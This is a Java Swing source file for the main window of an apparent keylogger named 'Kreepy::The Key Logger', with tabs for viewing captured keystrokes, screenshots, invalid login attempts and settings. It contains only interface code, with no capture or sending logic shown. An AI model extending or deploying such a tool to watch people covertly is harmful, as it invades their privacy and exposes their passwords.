import javax.swing.*;
import java.awt.*;
import java.io.IOException;

public class MainDialog extends JFrame{
	static JTabbedPane tabbedPane;
	private JPanel panel1;
	static boolean flag;
	private JPanel panel4;
	private JPanel viewLog = null;
	static JPanel screenshotLog = null;
	JPanel invalidAttemptLog=null;
	static private JPanel settings = null;

	public MainDialog(){
		setTitle("Kreepy::The Key Logger");
		setSize(800,400);
		setLocation(100,100);
		setBackground(Color.GRAY);

		setIconImage(new ImageIcon("lib/images/eye.png").getImage());

		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		setVisible(true);
		JPanel topPanel=new JPanel();
		topPanel.setLayout(new BorderLayout());

		Container contentPane=getContentPane();
		contentPane.add(topPanel);

		createPage1();
		createPage2();
		createPage3();
		createPage4();

		tabbedPane=new JTabbedPane();
		tabbedPane.addTab("Settings", settings);
		tabbedPane.addTab("Key Strokes", viewLog);
		tabbedPane.addTab("Screenshots", screenshotLog);
		tabbedPane.addTab("Invalid Logins", invalidAttemptLog);
		topPanel.add(tabbedPane,BorderLayout.CENTER);
	}
	public MainDialog(boolean flag_inflow){
		flag=flag_inflow;
	}

	public void createPage1()
	{
		try {
			invalidAttemptLog = new InvalidAttemptLog();
		} catch (IOException e) {
			e.printStackTrace();
		}
		invalidAttemptLog.setVisible(true);
	}

	public void createPage2()
	{
		try {
			viewLog = new View_Log();
		} catch (IOException e) {
			e.printStackTrace();
		}
		viewLog.setVisible(true);
	}

	static public void createPage3()
	{
		try {
			screenshotLog = new Screenshot_Log();
		} catch (IOException e) {
			e.printStackTrace();
		}
		screenshotLog.setVisible(true);
	}

	public void createPage4()
	{
		settings = new Settings();
		settings.setVisible(true);
	}
}